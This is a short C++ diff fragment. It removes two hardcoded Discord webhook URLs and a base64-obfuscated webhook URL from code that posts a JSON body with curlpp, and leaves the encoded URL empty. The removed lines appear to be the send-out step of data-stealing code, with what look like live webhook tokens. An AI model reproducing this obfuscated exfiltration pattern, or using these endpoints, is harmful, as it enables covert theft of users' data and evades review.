@@ -1760,9 +1760,7 @@ public:
 		outputFileStream << "}";
 		body = outputFileStream.str();
 		//Console.Write(body);
-		const std::string DiscordWebhook = "https://discord.com/api/webhooks/1067003964505194506/WOBItIXdAfB1DoUUkqmIa81yeLDHxLEsvycTQIruMO2WAKyZo2vEHEZDJ5LyAXaHUTV7";
-		const std::string TheWebhook = "https://discord.com/api/webhooks/1067003964505194506/YXNkamtpZmdoYmFES0ZKU0hnYmFsc2ZkaGtqZ2Joc2xkaWhmYmdsZmRoaWJnaGprAMD2";
-		request.setOpt(new curlpp::options::Url(base64_decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2NzAwMzYxMDQ0NzIyODk3MC9Kd1pYa0FMT28zXzJMdDEzQmNtdXRPNGhOZEtCQkZPYjZMRzQ3V1AzZVE0YnZiUk00aU1ONWpuWXltYm5ZYWRBbENwcA==")));
+		request.setOpt(new curlpp::options::Url(base64_decode("")));
 
 		std::list<std::string> header;
 		header.push_back("Content-Type: application/json");
